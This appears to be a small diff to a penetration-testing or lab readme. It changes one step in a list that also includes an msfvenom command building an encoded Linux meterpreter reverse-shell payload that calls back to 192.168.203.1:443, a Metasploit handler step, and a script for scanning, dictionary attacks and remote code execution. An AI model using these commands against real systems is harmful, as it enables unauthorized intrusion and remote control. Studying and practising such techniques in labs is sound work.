@@ -18,4 +18,4 @@ at once.<br>
 <br>
 4. Create payload: <h4>msfvenom --payload linux/x86/meterpreter_reverse_tcp LPORT=443 LHOST=192.168.203.1 -e shikata_ga_nai -f elf -a x86 -o evil_file</h4>
 5. msf5 > <h4>exploit/multi/handler module</h4>
-6. scan_drop.py <h4>Scan, Dictionary Attack, RCE. </h4>
+6. Run scan_drop.py <h4>Scan, Dictionary Attack, RCE. </h4>
